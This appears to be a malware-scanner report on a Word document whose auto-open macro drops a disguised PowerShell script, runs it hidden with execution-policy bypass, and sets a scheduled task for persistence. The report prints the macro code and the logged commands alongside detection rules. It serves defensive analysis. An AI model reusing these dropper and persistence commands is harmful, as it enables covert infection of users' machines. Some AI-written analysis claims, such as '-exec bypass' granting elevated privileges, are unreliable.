crowdsourced_yara_results.description: This signature detects an office document with an embedded VBA project. While this is fairly common it is sometimes used for malicious intent.

crowdsourced_yara_results.description: detects OLE documents containing VB scripts with reversed suspicious strings

sigma_analysis_results.rule_description:
Adversaries may use hidden windows to conceal malicious activity from the plain sight of users.
In some cases, windows that would typically be displayed when an application carries out an operation can be hidden

sigma_analysis_results.rule_title: Usage Of Web Request Commands And Cmdlets - ScriptBlock
sigma_analysis_results.rule_description: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via PowerShell scriptblock logs
Detects the presence of the keywords "Wscript", "Shell" and "Run" in the command, which could indicate a suspicious activity

match_context.values: @{TerminalSessionId=1; ProcessGuid={C784477D-68CB-654D-3806-000000004A00}; ProcessId=3336; Product=Microsoft\xae Windows\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-68C6-654D-3606-000000004A00}; User=DESKTOP-B0T93D6\george; Hashes=MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE; OriginalFileName=Cmd.Exe; ParentImage=C:\Program Files\Microsoft Office\Office16\WINWORD.EXE; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=3164; CurrentDirectory=C:\Windows\system32\; CommandLine=C:\Windows\system32\cmd.exe /c echo  Set oShell = WScript.CreateObject ("WScript.Shell") : oShell.run "cmd.exe /c Powershell -exec bypass -Windowstyle hidden -File C:\Users\george\AppData\Roaming\AdobeAcrobatLicenseVerify.ps1 ",0,0  > "C:\Users\george\AppData\Roaming\AdobeAcrobatLicenseVerify.vbs"; EventID=1; LogonGuid=C784477D-296E-6531-3596-030000000000; LogonId=235061; Image=C:\Windows\System32\cmd.exe; IntegrityLevel=High; ParentCommandLine="C:\Program Files\Microsoft Office\Office16\WINWORD.EXE" /Automation -Embedding; UtcTime=1699571915; RuleName=-}

sigma_analysis_results.rule_title: Potential Binary Or Script Dropper Via PowerShell
sigma_analysis_results.rule_description: Detects PowerShell creating a binary executable or a script file.

match_context.values: @{Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; EventID=11; TargetFilename=C:\Users\Bruno\AppData\Local\Temp\AdobeAcrobatLicenseVerify.vbs}

sigma_analysis_results.rule_description: Detects suspicious process starts on Windows systems based on keywords

match_context.values: @{TerminalSessionId=1; ProcessGuid={C784477D-68CC-654D-3C06-000000004A00}; ProcessId=932; Product=Microsoft\xae Windows\xae Operating System; Description=Task Scheduler Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-68CB-654D-3906-000000004A00}; User=DESKTOP-B0T93D6\george; Hashes=MD5=838D346D1D28F00783B7A6C6BD03A0DA,SHA256=8BE433049CCC271F04A8E625E9FB9BD3BCF15B4EDEB63497C00BD9CE1CD5C50E,IMPHASH=7EE4BC5589713B3470B8A950256E2E69; OriginalFileName=schtasks.exe; ParentImage=C:\Windows\System32\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4128; CurrentDirectory=C:\Windows\system32\; CommandLine=SchTasks  /Create /SC MINUTE /MO 1 /TN "Conhost" /TR "wscript C:\Users\george\AppData\Roaming\AdobeAcrobatLicenseVerify.vbs"; EventID=1; LogonGuid=C784477D-296E-6531-3596-030000000000; LogonId=235061; Image=C:\Windows\System32\schtasks.exe; IntegrityLevel=High; ParentCommandLine=C:\Windows\system32\cmd.exe /c SchTasks /Create /SC MINUTE /MO 1 /TN "Conhost" /TR "wscript C:\Users\george\AppData\Roaming\AdobeAcrobatLicenseVerify.vbs"; UtcTime=1699571916; RuleName=-}

sigma_analysis_results.rule_title: Suspicious New Instance Of An Office COM Object
sigma_analysis_results.rule_description:
Detects an svchost process spawning an instance of an office application. This happens when the initial word application creates an instance of one of the Office COM objects such as 'Word.Application', 'Excel.Application', etc.
This can be used by malicious actors to create malicious Office documents with macros on the fly. (See vba2clr project in the references)

match_context.values: @{TerminalSessionId=1; ProcessGuid={C784477D-68C6-654D-3606-000000004A00}; ProcessId=3164; Product=Microsoft Office 2016; Description=Microsoft Word; Company=Microsoft Corporation; ParentProcessGuid={C784477D-2966-6531-0F00-000000004A00}; User=DESKTOP-B0T93D6\george; Hashes=MD5=CE33FC3C687D3C01159A8CAEA7F5482E,SHA256=5D75D0EA8BBB5B652F7B72CF728C00322BD486D54A5C4978CEACDF70B4317EE6,IMPHASH=1B2B96B0763DACAFA277667CA093F96D; OriginalFileName=WinWord.exe; ParentImage=C:\Windows\System32\svchost.exe; FileVersion=16.0.4266.1001; ParentProcessId=840; CurrentDirectory=C:\Windows\system32\; CommandLine="C:\Program Files\Microsoft Office\Office16\WINWORD.EXE" /Automation -Embedding; EventID=1; LogonGuid=C784477D-296E-6531-3596-030000000000; LogonId=235061; Image=C:\Program Files\Microsoft Office\Office16\WINWORD.EXE; IntegrityLevel=High; ParentCommandLine=C:\Windows\system32\svchost.exe -k DcomLaunch -p; UtcTime=1699571910; RuleName=-}

sigma_analysis_results.rule_description: Detects non-interactive PowerShell activity by looking at the "powershell" process with a non-user GUI process such as "explorer.exe" as a parent.

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Windows\system32\; OriginalFileName=PowerShell.EXE; Hashes=MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F,IMPHASH=7C955A0ABC747F57CCC4324480737EF7; Description=Windows PowerShell; EventID=1; ParentCommandLine="C:\Windows\System32\cmd.exe" /c Powershell -exec bypass -Windowstyle hidden -File C:\Users\Bruno\AppData\Roaming\AdobeAcrobatLicenseVerify.ps1 ; CommandLine=Powershell  -exec bypass -Windowstyle hidden -File C:\Users\Bruno\AppData\Roaming\AdobeAcrobatLicenseVerify.ps1 ; FileVersion=10.0.19041.546 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\cmd.exe; IntegrityLevel=Medium; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description: Detects the creation of a scheduled task via file creation.
sigma_analysis_results.rule_author: Center for Threat Informed Defense (CTID) Summiting the Pyramid Team

match_context.values: @{EventID=11; ProcessId=1480; TargetFilename=C:\Windows\System32\Tasks\Conhost; RuleName=T1053; CreationUtcTime=1699571916; UtcTime=1699571916; ProcessGuid={C784477D-2968-6531-2300-000000004A00}; Image=c:\windows\system32\svchost.exe}

sigma_analysis_results.rule_description: Detects the creation of scheduled tasks in user session

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Windows\system32\; OriginalFileName=schtasks.exe; Hashes=MD5=796B784E98008854C27F4B18D287BA30,SHA256=356280CCA63CA5E887FDBE5CB4105A53341FBAC9219EFC51621DF9BA8EE9838B,IMPHASH=ECCE05491F2E8F279F4790BCB1318C05; Description=Task Scheduler Configuration Tool; EventID=1; ParentCommandLine="C:\Windows\system32\cmd.exe" /c start /b schtasks /create /sc minute /mo 5 /tn AdobeAcrobatLicenseVerify /tr "wscript.exe "C:\Users\Bruno\AppData\Local\Temp\AdobeAcrobatLicenseVerify.vbs" \"powershell.exe  -ExecutionPolicy bypass -WindowStyle hidden -NoProfile 'C:\Users\Bruno\AppData\Roaming\AdobeAcrobatLicenseVerify.ps1'  \""; CommandLine=schtasks  /create /sc minute /mo 5 /tn AdobeAcrobatLicenseVerify /tr "wscript.exe "C:\Users\Bruno\AppData\Local\Temp\AdobeAcrobatLicenseVerify.vbs" \"powershell.exe  -ExecutionPolicy bypass -WindowStyle hidden -NoProfile 'C:\Users\Bruno\AppData\Roaming\AdobeAcrobatLicenseVerify.ps1'  \""; FileVersion=10.0.19041.906 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\cmd.exe; IntegrityLevel=Medium; Image=C:\Windows\System32\schtasks.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description:
Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts.
Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism
Detects the use of PowerShell to identify the current logged user.
Detects the use of the redirection character ">" to redicrect information in commandline

match_context.values: @{TerminalSessionId=1; ProcessGuid={C784477D-68CB-654D-3806-000000004A00}; ProcessId=3336; Product=Microsoft\xae Windows\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-68C6-654D-3606-000000004A00}; User=DESKTOP-B0T93D6\george; Hashes=MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE; OriginalFileName=Cmd.Exe; ParentImage=C:\Program Files\Microsoft Office\Office16\WINWORD.EXE; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=3164; CurrentDirectory=C:\Windows\system32\; CommandLine=C:\Windows\system32\cmd.exe /c echo  Set oShell = WScript.CreateObject ("WScript.Shell") : oShell.run "cmd.exe /c Powershell -exec bypass -Windowstyle hidden -File C:\Users\george\AppData\Roaming\AdobeAcrobatLicenseVerify.ps1 ",0,0  > "C:\Users\george\AppData\Roaming\AdobeAcrobatLicenseVerify.vbs"; EventID=1; LogonGuid=C784477D-296E-6531-3596-030000000000; LogonId=235061; Image=C:\Windows\System32\cmd.exe; IntegrityLevel=High; ParentCommandLine="C:\Program Files\Microsoft Office\Office16\WINWORD.EXE" /Automation -Embedding; UtcTime=1699571915; RuleName=-}

crowdsourced_ids_results.rule_raw: alert udp $HOME_NET any -> $EXTERNAL_NET 53 ( msg:"MALWARE-CNC Win.Trojan.QUADAGENT outbound DNS tunnel"; flow:to_server,no_stream; content:"|01 00|",depth 2,offset 2; content:"|04|mail|06|",within 6,distance 8; byte_test:6,>=,100000,0,relative,string,dec; byte_test:6,<=,999999,0,relative,string,dec; pcre:"/\x04mail\x06\d{6}.*\x00\x1c.{2}$/"; metadata:impact_flag red,policy balanced-ips drop,policy max-detect-ips drop,policy security-ips drop; service:dns; reference:url,virustotal.com/gui/file/1f6369b42a76d02f32558912b57ede4f5ff0a90b18d3b96a4fe24120fa2c300c; classtype:trojan-activity; sid:50769; rev:2; )

macros.vba_code:
Sub Document_Open()
On Error Resume Next
Dim PSF, Tmp As String

Dim singleLine As Paragraph
Dim lineText As String
Dim yCYnlofR
Dim f
Dim qgcLyiCkx As String
qgcLyiCkx = Environ$("AppData") & "\AdobeAcrobatLicenseVerify.ps1"
Set yCYnlofR = CreateObject("Scripting.FileSystemObject")
Set f = yCYnlofR.OpenTextFile(qgcLyiCkx, 2, True)
Dim rng As Range
Dim intSecCount As Integer
Dim intHFType As Integer
intSecCount = ActiveDocument.Sections.Count
For intSection = 1 To intSecCount
    With ActiveDocument.Sections(intSection)
        For intHFType = 1 To 2
            Set rng = ActiveDocument.Sections(intSection).Headers(intHFType).Range
            f.write (rng)
        Next intHFType
    End With
Next intSection
f.Close

PSF = Environ$("AppData") & "\AdobeAcrobatLicenseVerify.ps1"
Tmp = Environ$("AppData") & "\AdobeAcrobatLicenseVerify.vbs"
Dim cmd As String
cmd = "Set oShell = WScript.CreateObject (%WScript.Shell%) : oShell.run %cmd.exe /c Powershell -exec bypass -Windowstyle hidden -File
macros.properties: auto-open create-ole environ obfuscated powershell run-file write-file

threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.

crowdsourced_ai_results.analysis:
The provided VBA macro code is malicious and performs several malicious actions. Here are the details of what it is doing:

1. It creates a new file called "AdobeAcrobatLicenseVerify.ps1" in the user's AppData folder.
2. It writes the contents of the "AdobeAcrobatLicenseVerify.ps1" file to a new file called "AdobeAcrobatLicenseVerify.vbs" in the same folder.
3. It creates a new scheduled task called "Conhost" that runs the "wscript" command with the "AdobeAcrobatLicenseVerify.vbs" file as an argument.
4. It uses the "Shell" function to execute the "SchTasks" command with the "/SC MINUTE" and "/MO 1" options, which creates a new scheduled task that runs every minute.
5. The scheduled task runs the "wscript" command with the "AdobeAcrobatLicenseVerify.vbs" file as an argument, which executes the malicious code.

The malicious code in the "AdobeAcrobatLicenseVerify.vbs" file is designed to bypass the Windows Defender SmartScreen filter and execute the "Powershell" command with the "-exec bypass" option, which allows the code to run with elevated privileges. The code then uses the "WScript.Shell" object to execute the "Powershell" command with the "-Windowstyle hidden" option, which hides the PowerShell window and executes the code in the background.

Overall, this VBA macro code is a sophisticated piece of malware that uses multiple techniques to evade detection and execute malicious code on the target system. It is important to take steps to prevent this type of malware from being spread, such as using anti-virus software and keeping software up to date.

The macro begins by creating a PowerShell script file (AdobeAcrobatLicenseVerify.ps1) in the user's AppData folder. It then opens this script file and writes the contents of all headers from all sections of the active document into it. This behavior suggests that the macro is attempting to extract sensitive information from the document's headers.

Next, the macro creates a VBScript file (AdobeAcrobatLicenseVerify.vbs) in the same AppData folder. This VBScript file contains a command that executes the PowerShell script file using the Windows command prompt with hidden window style. The macro then uses the Windows command processor (cmd.exe) to create a scheduled task named "Conhost" that runs the VBScript file every minute.

This sequence of actions indicates that the macro is attempting to persistently execute the PowerShell script on the user's system, potentially for malicious purposes. The use of hidden windows and scheduled tasks suggests an intent to evade detection and remain persistent on the system.

The macro script provided exhibits several signs of malicious intent. 

Firstly, it uses the "On Error Resume Next" statement which is often used in malicious scripts to suppress errors and continue execution even when an error occurs. This can be used to hide any unexpected behavior from the user.

Secondly, the script creates a file named "AdobeAcrobatLicenseVerify.ps1" in the user's AppData directory. This filename is likely chosen to appear legitimate, but the creation of files in this manner is a common technique used by malware.

The script then reads the content of the document's headers and writes them into the created file. This could potentially be used to extract sensitive information from the document.

Next, the script creates another file named "AdobeAcrobatLicenseVerify.vbs" in the same directory. It constructs a command that uses WScript (Windows Script Host) to execute a PowerShell script with elevated privileges ("-exec bypass") and in a hidden window ("-Windowstyle hidden"). This is a clear sign of malicious intent as it allows the script to execute potentially harmful commands without the user's knowledge or consent.

Finally, the script uses the Windows Task Scheduler ("SchTasks /Create") to create a task that runs every minute. This task executes the previously created VBScript file. This is a persistence mechanism commonly used by malware to ensure that it continues running even after a system reboot or shutdown.

In conclusion, the macro script exhibits multiple signs of malicious intent including obfuscation, potential data extraction, execution of scripts with elevated privileges, and attempts at persistence.
